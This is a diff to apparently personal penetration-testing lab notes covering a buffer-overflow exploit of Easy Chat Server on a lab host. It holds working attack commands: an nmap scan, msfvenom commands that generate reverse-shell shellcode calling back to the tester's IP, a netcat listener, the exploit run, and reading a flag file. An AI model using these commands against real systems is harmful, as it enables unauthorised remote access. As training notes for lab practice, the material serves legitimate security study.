@@ -1259,7 +1259,8 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - `nmap -sVC -p- -v -T4 -sT --open 192.168.171.213`: 20000/tcp open  http  Easy Chat Server httpd 1.0
   - `searchsploit Easy Chat Server`: [Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/50999)  
   - Generate shellcode  
-    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`
+    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`： original one not working with netcat listener as meterpreter using
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`  
   - Modify shellcode
     ```
     shellcode = b"\x90" * 16
@@ -1270,7 +1271,8 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     buffer += b"Referer: http://192.168.171.213\r\n"
     ```
   - Start netcat listener: `nc -lvnp 443`
-  - Exploit `python2 easychat_50999.py 192.168.171.213 20000`  
+  - Exploit `python2 easychat_50999.py 192.168.171.213 20000`
+  - type C:\Users\Administrator\Desktop\flag.txt
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
